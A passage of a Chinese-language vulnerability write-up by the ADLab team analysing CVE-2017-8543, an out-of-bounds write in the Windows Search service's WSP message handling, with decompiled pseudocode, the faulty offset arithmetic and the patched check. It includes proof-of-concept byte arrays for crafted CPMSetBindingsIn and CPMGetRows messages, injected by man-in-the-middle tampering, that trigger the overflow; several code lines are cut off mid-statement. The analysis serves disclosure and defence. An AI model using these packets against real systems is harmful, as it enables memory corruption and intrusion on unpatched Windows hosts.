        }
（1）`UnmarshallRowSeekDescription` 函数根据 etype
类型（eRowSeekNext，eRowSeekAt，eRowSeekAtRatio或eRowSeekByBookmark），返回 SeekMethod
方法对象。
（2）如果 `cbReadBuffer_24` 长度大于 `0x1300`，分配新内存存放 `CMPRowsOut`， `pCMPGetRowsOut`
指向分配的地址。
（3）使用 `pCMPGetRowsOut` 指针初始化 `CFixedVarBufferAllocator`
类对象。`CFixedVarBufferAllocator` 构造函数如下所示。其中两个关键的数据成员： **RowBufferStart** 地址为
rows 数据的基地址， **RowBufferEnd** 表示当前可用的末尾地址。
        CFixedVarBufferAllocator(char *ReadBuffer,int a1,int cbReadBuffer,int cbRowWidth,int cbReserved)
        {
            pvatable_0 = &CFixedVarBufferAllocator::`vftable'{for `PVarAllocator'};
            isequal_4 = (ReadBuffer != 0);
            pvatable_8 = &CFixedVarBufferAllocator::`vftable'{for `PFixedAllocator'};
            ReadBuffer_0c = ReadBuffer;
            ReadBuffer_10 = ReadBuffer;
            var_14 = a1;
            RowBufferStart_18 = (char *)ReadBuffer + cbReserved;
            RowBufferEnd_1c = (char *)ReadBuffer + cbReadBuffer;
            cbRowWidth_20 = cbRowWidth;
            cbReserved_24 = cbReserved; 
            while (RowBufferEnd_1c & 7 )
            {
                --RowBufferEnd_1c;
            }
        }
（4）使用对象地址 `&cCFixedVarBufferAllocator`，`cbRowWidth` 等参数初始化 `CGetRowsParams`
对象。最后调用 `CVIQuery:: GetRows` 函数。
        int CVIQuery::GetRows(int hCursor,
            CRowSeekMethod *pCRowSeekmethod,
            CGetRowsParams *pCGetRowsParams,
            CRowSeekMethod *pCRowSeekMethod_new)
        {
            int result;
            CItemCursor *pCItemCursor = *(DWORD *)(var_68 + 4*hCursor);
            CTableCursor *pCTableCursor = pCItemCursor + 0x14;
            pCTableCursor->ValidateBindings();  //检查pCTableCursor->pCTableColumnSet_4是否为
            result = pCRowSeekmethod->GetRows(pCTableCursor,
                pCItemCursor,
                pCGetRowsParams,
                pCRowSeekMethod_new);
            return result;
            //.................
        } 
假设 `etype=eRowSeekAt`，则 `pCRowSeekmethod` 指针 `CRowSeekAt` 类指针。此时函数调用序列：
    CVIQuery::GetRows->CRowSeekAt:: GetRows->CVICursor:: GetRowsAt
`CVICursor:: GetRowsAt` 函数实现如下所示。其中，参数 `pCTableColumnSet` 是由前面的
`DoSetBindings` 函数构造。在 while 循环中：
  * 调用 `CFixedVarBufferAllocator::AllocFixed` 获取当前行 (row) 存放的基地址 RowBufferBase。
  * 调用 `CItemCursor::GetRow` 依次获取每一行(row)数据。
        int CVICursor::GetRowsAt(int hRegion,
            int bmkOffset,
            int chapt,
            int cskip,
            CTableColumnSet *pCTableColumnSet,
            CGetRowsParams *pCGetRowsParams,
            int *pbmkOffset)
        {
            int result;
            int fBwdFetch = pCGetRowsParams->fBwdFetch_14;
            //this=pCItemCursor
            while(pCGetRowsParams->cRowsToTransfer_0!=pCGetRowsParams->cRowsAlreadyGet_4&&!result) 
            {
                char *RowBufferBase = pCGetRowsParams->pCFixedVarBufferAllocator_8->AllocFixed();
                int index=0;
                result = ((CItemCursor*)this)->GetRow(index, pCTableColumnSet, pCGetRowsParams,                     RowBufferBase);
                if(!result)
                {
                    pCGetRowsParams->cRowsAlreadyGet_4++;
                    pCGetRowsParams->var_10 = 0;
                    *pbmkOffset = index + 1;
                    if(fBwdFetch)
                        index++;
                    else
                        index--;
                }
            }
        }
        --------------------------------------------------------------------------------------------        char* CFixedVarBufferAllocator::AllocFixed()
        {
            char *result = RowBufferStart_18;
            try
            {
                if(RowBufferEnd_1c - RowBufferStart_18 Get(index); //1=get(0);
            CWIDToOffset *pCWIDToOffset = *(DWORD*)(pCVIQuery_10->var_7c);
            return pCWIDToOffset->GetItemRow(index,value,pCTableColumnSet, pCGetRowsParams,     RowBufferBase);
        }
    ------------------------------------------------------------------------------------------        int CWIDToOffset::GetItemRow(int index, int value,CTableColumnSet *pCTableColumnSet,    CGetRowsParams *pCGetRowsParams, char* RowBufferBase)
        {
            //...........
            int index=0;
            CTableVariant *pCTableVariant;
            while(indexlen_0)
            {
                //............
                CTableColumn* pCTableColumn = pCTableColumnSet->Get(index_column);
                int var5;
                pCTableVariant = (CTableVariant*)(RowBufferBase + pCTableColumn->ValueOffset_04);
                CTableVariant::CopyOrCoerce(pCTableVariant,
                    pCTableColumn->ValueSize_06,
                    pCTableColumn->Vtype_0E,
                    &var5,
                    pCGetRowsParams->pCFixedVarBufferAllocator_8);//写入列属性数据
            }
        }
在 `CTableVariant::CopyOrCoerce` 函数中，当 `vtype=0x0c`，首先调用 `VarDataSize`
函数，返回变长数据大小 size。
  * 如果 column 为定长数据，size=0， 直接填充 `pCTableVariant` 指针数据。
        void CTableVariant::CopyOrCoerce(CTableVariant *pCTableVariant,int ValueSize,int Vtype,int  *var5,CFixedVarBufferAllocator* pCFixedVarBufferAllocator)
        {
            //..........
            if(Vtype==0x0c)
            {
                int size = VarDataSize();
                Copy(pCTableVariant, pCFixedVarBufferAllocator, size, 0);
            }
            //.........
        }
        void CTableVariant::Copy(CTableVariant *pCTableVariant,CFixedVarBufferAllocator* pCFixedVarBufferAllocator,int  size,int a4)
        {
            //............
            if(size)
                CTableVariant::CopyData(pCFixedVarBufferAllocator, size, a4);
            pCTableVariant->vtype=vtype;
            pCTableVariant->reserved1=reserved1;
            pCTableVariant->reserved2=reserved2;
            pCTableVariant->offset=offset;
        }
  * 如果 column 为变长数据，`size>0`。函数调用序列如下：`CTableVariant::CopyData-> PVarAllocator::CopyTo-> CFixedVarBufferAllocator::Allocate`
调用 `CFixedVarBufferAllocator::Allocate` 获取字符串存放地址：首先计算是否存在足够的存储空间，从
`RowBufferEnd_1c` 位置向前寻找存储空间存放字符串：`RowBufferEnd_1c =
RowBufferEnd_1c-size`；然后调用 `memcpy` 拷贝字符串。
        void * CopyTo(int size, char *src)
        {
            char *buffer = Allocate(size);
            memcpy(buffer, Src, Size);
            return buffer;
        }
        void* CFixedVarBufferAllocator::Allocate(int size)
        {
            try
            {
                if(RowBufferEnd_1c-RowBufferStart_18运行，输入
`“\\servername”`，回车，即可看到共享文件夹。打开文件夹，在搜索框里输入关键字进行搜索，这个搜索过程会产生一系列的 WSP 消息交互序列。
![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab14200.png-w331s)
可以通过中间人的方式，修改数据包来重现这个漏洞。修改 `CPMSetBindingsIn` 和 `CPMGetRows` 消息，如下所示。
    char CPMSetBindingsIn[] =
    "\xd0\x00\x00\x00\x00\x00\x00\x00\x7c\x19\x35\xbd\x00\x00\x00\x00"
    "\x01\x00\x00\x00"  //_hCursor
    "\x78\x07\x00\x00" //_cbRow
    "\x34\x00\x00\x00"//_cbBindingDesc
    "\x50\x39\xee\x69"
    "\x01\x00\x00\x00"  // cbRow
    "\x70\x39\xee\x69" //padding
    "\x90\x1c\x69\x49\x17\x7e\x1a\x10\xa9\x1c\x08\x00\x2b\x2e\xcd\xa9" //GUID
    "\x01\x00\x00\x00"
    "\x05\x00\x00\x00"
    "\x0c\x00\x00\x00"
    "\x01\x00"
    "\x01\x00"
    "\x60\x07"  //ValueOffset
    "\x10\x00"  //ValueSize
    "\x01\x00"
    "\x02\x00"
    "\x01\x00"
    "\x04\x00";
    char CPMGetRows[] =
    "\xcc\x00\x00\x00\x00\x00\x00\x00\xae\x12\xfd\x5c\x00\x00\x00\x00"
    "\x01\x00\x00\x00" //#+0x010 _hCursor
    "\x20\x00\x00\x00" //#+0x014 _cRowsToTransfer
    "\x02\x07\x00\x00"//#+0x018 _cbRowWidth
    "\x14\x00\x00\x00" //#+0x01c _cbSeek
    "\xee\x38\x00\x00"// #+0x020 _cbReserved
    "\x00\x40\x00\x00" //#+0x024 _cbReadBuffer
    "\x58\xe8\xad\x05" //#+0x028 _ulClientBase
    "\x00\x00\x00\x00" //#+0x02c _fBwdFetch 
    "\x02\x00\x00\x00" //eType,eRowSeekAt
    "\x00\x00\x00\x00" //_chapt
    "\xfc\xff\xff\xff"//_bmkOffset
    "\x00\x00\x00\x00"//_cskip
    "\x00\x00\x00\x00";//_hRegion
    cbReadBuffer=0x4000
    RowBufferBase = ReadBuffer + _cbReserved = ReadBuffer + 0x38ee
    CTableVariant *pCTableVariant = RowBase + valueoffset = ReadBuffer+0x38ee+0x760 = ReadBuffer + 404e
而 ReadBuffer 大小为 0x4000，因此向 column 中写入数据时，将发生地址越界。
其实，在前面获取 RowBufferBase 的 `CFixedVarBufferAllocator::AllocFixed` 函数中，是进行了合法检查的。
        char* CFixedVarBufferAllocator::AllocFixed()
        {
            char *result = RowBufferStart_18;
            try
            {
                if(RowBufferEnd_1c - RowBufferStart_18 GetRows` 函数前，对
`cbRowWidth` 的合法性进行判断。其中，`pCTableCursor->cbRow_2` 值为 `CPMSetBindingsIn` 消息中的
`cbRow` 。
        int CVIQuery::GetRows(int hCursor,
            CRowSeekMethod *pCRowSeekmethod,
            CGetRowsParams *pCGetRowsParams,
            CRowSeekMethod *pCRowSeekMethod_new)
        {
            int result;
            CItemCursor *pCItemCursor = *(DWORD *)(var_68 + 4*hCursor);
            CTableCursor *pCTableCursor = pCItemCursor + 0x14;
            pCTableCursor->ValidateBindings();
            if(pCTableCursor->cbRow_2 != pCGetRowsParams->cbRowWidth_c)
                return 0x80070057;
            result = pCRowSeekmethod->GetRows(pCTableCursor,
                pCItemCursor,
                pCGetRowsParams,
                pCRowSeekMethod_new);
            return result;
            //.................
        } 
* * *
**启明星辰积极防御实验室（ADLab）**
ADLab成立于1999年，是中国安全行业最早成立的攻防技术研究实验室之一，微软MAPP计划核心成员。截止目前，ADLab通过CVE发布Windows、Linux、Unix等操作系统安全或软件漏洞近300个，持续保持亚洲领先并确立了其在国际网络安全领域的核心地位。实验室研究方向涵盖操作系统与应用系统安全研究、移动智能终端安全研究、物联网智能设备安全研究、Web安全研究、工控系统安全研究、云安全研究。研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。
* * *